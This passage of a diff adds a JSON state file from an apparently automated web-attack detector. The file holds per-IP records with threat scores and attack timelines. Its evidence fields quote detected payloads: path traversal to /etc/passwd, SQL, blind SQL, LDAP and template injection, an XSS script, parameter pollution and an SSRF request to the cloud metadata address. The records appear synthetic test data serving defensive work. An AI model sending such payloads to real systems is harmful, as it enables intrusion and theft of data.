+    "91.44.12.13": {
+      "ip": "91.44.12.13",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "91.44.12.14": {
+      "ip": "91.44.12.14",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "http_verb_tampering"
+      ],
+      "attack_categories_seen": [
+        "evasion"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "http_verb_tampering",
+          "evidence": "Unusual HTTP method: TRACE",
+          "batch_number": 8
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "http_verb_tampering",
+          "evidence": "Unusual HTTP method: TRACE",
+          "batch_number": 9
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "http_verb_tampering",
+          "evidence": "Unusual HTTP method: TRACE",
+          "batch_number": 10
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "http_verb_tampering",
+          "evidence": "Unusual HTTP method: TRACE",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "http_verb_tampering",
+          "evidence": "Unusual HTTP method: TRACE",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.5,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "91.44.12.15": {
+      "ip": "91.44.12.15",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "91.44.12.16": {
+      "ip": "91.44.12.16",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.92": {
+      "ip": "203.0.113.92",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 36,
+      "requests_by_status": {
+        "200": 30
+      },
+      "unique_uris_accessed": 30,
+      "auth_failures_total": 0,
+      "auth_successes_total": 30,
+      "attack_signatures_seen": [
+        "path_normalization_bypass:dot_encoded"
+      ],
+      "attack_categories_seen": [
+        "evasion"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "path_normalization_bypass:dot_encoded",
+          "evidence": "Dot-encoded path traversal bypass detected (actor: -): /%252e%252e%252fetc/passwd",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "path_normalization_bypass:dot_encoded",
+          "evidence": "Dot-encoded path traversal bypass detected (actor: -): /%252e%252e%252fetc/passwd",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 6,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 6,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 6,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 6,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 6,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 6,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "8.8.8.8": {
+      "ip": "8.8.8.8",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "xpath_injection"
+      ],
+      "attack_categories_seen": [
+        "xpath_injection"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "xpath_injection",
+          "rule_name": "xpath_injection",
+          "evidence": "/product?id=1' OR '1'='1",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "xpath_injection",
+          "rule_name": "xpath_injection",
+          "evidence": "/product?id=1' OR '1'='1",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "8.8.4.4": {
+      "ip": "8.8.4.4",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "blind_sql_injection"
+      ],
+      "attack_categories_seen": [
+        "blind_sql_injection"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "blind_sql_injection",
+          "rule_name": "blind_sql_injection",
+          "evidence": "score=10; patterns=SLEEP_FUNCTION, SLEEP_FUNCTION; evidence=/product?id=1 AND SLEEP(5) | /product?id",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "blind_sql_injection",
+          "rule_name": "blind_sql_injection",
+          "evidence": "score=10; patterns=SLEEP_FUNCTION, SLEEP_FUNCTION; evidence=/product?id=1 AND SLEEP(5) | /product?id",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.6,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.9": {
+      "ip": "9.9.9.9",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "xss"
+      ],
+      "attack_categories_seen": [
+        "cross_site_scripting"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "cross_site_scripting",
+          "rule_name": "xss",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 9.9.9.9 - - [21/May/2026:10:10:11 +0000] \"GET /search",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "cross_site_scripting",
+          "rule_name": "xss",
+          "evidence": "/search?q=<script>alert(1)</script>",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "cross_site_scripting",
+          "rule_name": "xss",
+          "evidence": "/search?q=<script>alert(1)</script>",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.6000000000000001,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.10": {
+      "ip": "9.9.9.10",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "ssti"
+      ],
+      "attack_categories_seen": [
+        "server_side_template_injection"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "server_side_template_injection",
+          "rule_name": "ssti",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 9.9.9.10 - - [21/May/2026:10:10:11 +0000] \"GET /?name",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "server_side_template_injection",
+          "rule_name": "ssti",
+          "evidence": "/?name={{7*7}}",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "server_side_template_injection",
+          "rule_name": "ssti",
+          "evidence": "/?name={{7*7}}",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.8999999999999999,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.11": {
+      "ip": "9.9.9.11",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "curl/7.88"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.12": {
+      "ip": "9.9.9.12",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "ldap_injection"
+      ],
+      "attack_categories_seen": [
+        "ldap_injection"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "ldap_injection",
+          "rule_name": "ldap_injection",
+          "evidence": "/ldap?user=*)(uid=*))(|(uid=*",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "ldap_injection",
+          "rule_name": "ldap_injection",
+          "evidence": "/ldap?user=*)(uid=*))(|(uid=*",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.13": {
+      "ip": "9.9.9.13",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.14": {
+      "ip": "9.9.9.14",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "xxe"
+      ],
+      "attack_categories_seen": [
+        "xml_external_entity"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "xml_external_entity",
+          "rule_name": "xxe",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 9.9.9.14 - - [21/May/2026:10:10:11 +0000] \"POST /uplo",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "xml_external_entity",
+          "rule_name": "xxe",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 9.9.9.14 - - [21/May/2026:10:10:11 +0000] \"POST /uplo",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "xml_external_entity",
+          "rule_name": "xxe",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 9.9.9.14 - - [21/May/2026:10:10:11 +0000] \"POST /uplo",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.8999999999999999,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.15": {
+      "ip": "9.9.9.15",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "http_param_pollution"
+      ],
+      "attack_categories_seen": [
+        "http_parameter_pollution"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "http_parameter_pollution",
+          "rule_name": "http_param_pollution",
+          "evidence": "/api?role=user&role=admin",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "http_parameter_pollution",
+          "rule_name": "http_param_pollution",
+          "evidence": "/api?role=user&role=admin",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.2,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.16": {
+      "ip": "9.9.9.16",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "500": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.17": {
+      "ip": "9.9.9.17",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "ssrf"
+      ],
+      "attack_categories_seen": [
+        "server_side_request_forgery"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "server_side_request_forgery",
+          "rule_name": "ssrf",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 9.9.9.17 - - [21/May/2026:10:10:11 +0000] \"GET /fetch",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "server_side_request_forgery",
+          "rule_name": "ssrf",
+          "evidence": "/fetch?url=http://169.254.169.254/latest/meta-data",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "server_side_request_forgery",
+          "rule_name": "ssrf",
+          "evidence": "/fetch?url=http://169.254.169.254/latest/meta-data",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.6000000000000001,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.18": {
+      "ip": "9.9.9.18",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        ":{"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "9.9.9.19": {
+      "ip": "9.9.9.19",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.93": {
+      "ip": "203.0.113.93",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 78,
+      "requests_by_status": {
+        "200": 65
+      },
+      "unique_uris_accessed": 55,
+      "auth_failures_total": 0,
+      "auth_successes_total": 65,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
